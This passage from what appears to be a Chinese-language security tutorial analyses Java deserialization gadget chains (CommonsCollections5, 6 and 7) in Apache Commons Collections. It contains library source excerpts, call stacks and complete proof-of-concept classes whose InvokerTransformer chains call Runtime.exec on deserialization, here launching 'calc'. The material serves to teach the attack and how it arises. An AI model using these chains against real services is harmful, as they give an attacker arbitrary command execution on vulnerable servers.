class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(exception);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">toString:132, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">readObject:86, BadAttributeValueExpException (javax.management)</span><br><span class="line">...</span><br><span class="line">main:41, CommonsCollections5 (com.example)</span><br></pre></td></tr></table></figure></div>
<h3 id="CommonsCollections6（HashMap→TiedMapEntry→LazyMap）"><a href="#CommonsCollections6（HashMap→TiedMapEntry→LazyMap）" class="headerlink" title="CommonsCollections6（HashMap→TiedMapEntry→LazyMap）"></a>CommonsCollections6（HashMap→TiedMapEntry→LazyMap）</h3><p><code>org.apache.commons.collections.keyvalue.TiedMapEntry</code> 的 <code>hashCode</code> 方法会调用到内部成员 <code>map</code> 的 <code>get</code> 方法，如果 <code>map</code> 被 <code>LazyMap</code> 修饰过就可以调用到 <code>transform</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry, KeyValue, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8453869361373831205L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getKey</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">               (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>java.util.HashMap#readObject</code> 方法会对 <code>key</code> 调用 <code>hash</code> 方法，进而调用 <code>key</code> 的 <code>hashCode</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>poc 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;sky&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">triggerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        triggerMap.put(entry, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line">        </span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(triggerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">readObject:1397, HashMap (java.util)</span><br><span class="line">...</span><br><span class="line">main:34, CommonsCollections6 (com.example)</span><br></pre></td></tr></table></figure></div>
<p>需要注意的是 <code>HashMap</code> 的 <code>put</code> 方法同样对 <code>key</code> 调用 <code>hash</code> 方法，进而调用 <code>key</code> 的 <code>hashCode</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>因此在 poc 中当我们 <code>triggerMap.put(entry, &quot;123&quot;)</code> 时会调用 <code>TiedMapEntry.hashCode</code> 从而调用 <code>LazyMap.get</code>，使得 <code>TiedMapEntry.key</code> 已经放到 <code>TiedMapEntry.map</code> 中了，因此会导致后续反序列化无法虽然调用到 <code>LazyMap.get</code>，但是调用不到 <code>transform</code> 方法。解决方法是调用 <code>LazyMap.clear</code> 清空 <code>LazyMap</code> 。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="CommonsCollections7（Hashtable→LazyMap）"><a href="#CommonsCollections7（Hashtable→LazyMap）" class="headerlink" title="CommonsCollections7（Hashtable→LazyMap）"></a>CommonsCollections7（Hashtable→LazyMap）</h3><p><code>Hashtable</code> 的 <code>readObject</code> 调用 <code>reconstitutionPut</code> 函数将反序列化出的键值对存储到哈希表 <code>table</code> 中。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">     <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Read in the length, threshold, and loadfactor</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">    <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">        <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">        reconstitutionPut(table, key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>reconstitutionPut</code> 函数先对传入的 <code>key</code> 调用 <code>hashCode</code> 方法得到哈希值，然后计算出哈希值对应哈希表的下标 <code>index</code>。在哈希表 <code>tab</code> 中遍历 <code>index</code> 对应的那一项中的每一个元素 <code>e</code>，然后判断该元素的哈希值与当前要添加的那一项的哈希值是否相等。如果哈希值相等则调用 <code>e.key.equals</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">    <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; <span class="comment">// 如果哈希值相等则对哈希表中的 key 调用 equals 方法。</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对于 <code>HashMap</code> 和 <code>LazyMap</code> 有如下继承关系：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/image-20241108030406773.png"
                      alt="image-20241108030406773"
                ><br>可以看到，<code>HashMap</code> 继承于 <code>AbstraceMap</code>，<code>LazyMap</code> 继承于 <code>AbstractMapDecorator</code>。</p>
<p>因此如果 <code>HashTable</code> 中的 <code>key</code> 都是 <code>LazyMap</code> 修饰的 <code>HashMap</code> 那么 <code>e.key.equals</code> 最终会调用 <code>LazyMap#get</code> 进而触发 <code>transform</code> 方法调用。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AbstraceMap</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (o == <span class="built_in">this</span>) <span class="comment">// 确保不是同一个 LazyMap 对象</span></span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">       <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">           <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">               Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">               <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">               <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">               <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                   <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key))) <span class="comment">// 调用 LazyMap#get</span></span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AbstractMapDecorator</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (object == <span class="built_in">this</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> map.equals(object);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
<p>根据前面的分析可知我们可以在 <code>Hashtable</code> 放两个键值对满足两个键哈希值相同但不是同一个的 <code>LazyMap</code> 对像。而 <code>LazyMap</code> 的哈希值实际上就是 <code>Map</code> 中所有「键和值的哈希的异或值」之和。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// Object</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> o != <span class="literal">null</span> ? o.hashCode() : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// HashMap$Node (Map.Entry)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// AbstraceMap</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (i.hasNext())</span><br><span class="line">            h += i.next().hashCode();</span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// AbstractMapDecorator</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">key.hashCode();</span><br></pre></td></tr></table></figure></div>
<p>我们不妨让键值对中的值相等，那么就只需要考虑找哈希相等且值不同的键。</p>
<p>我们选择 <code>java.lang.String</code> 类型的键，这个类型的 <code>hashCode</code> 实现如下，我们很容易就想到可以构造长度为 2 的字符串，然后通过前一个字符的 ascii 码加 1 然后后一个字符的 ascii 码减 31 抵消前一个字符的影响来得到两个哈希相同的字符串（例如 <code>Aa</code>→<code>[65,97]</code>→<code>[65+1,97-31]</code>→<code>[66,66]</code>→<code>BB</code>）。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hash;</span><br><span class="line">    <span class="keyword">if</span> (h == <span class="number">0</span> &amp;&amp; value.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">char</span> val[] = value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">            h = <span class="number">31</span> * h + val[i];</span><br><span class="line">        &#125;</span><br><span class="line">        hash = h;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>完整 poc 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">        outerMap1.put(<span class="string">&quot;Aa&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        outerMap2.put(<span class="string">&quot;BB&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(outerMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(outerMap2, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        outerMap2.remove(<span class="string">&quot;Aa&quot;</span>);</span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span 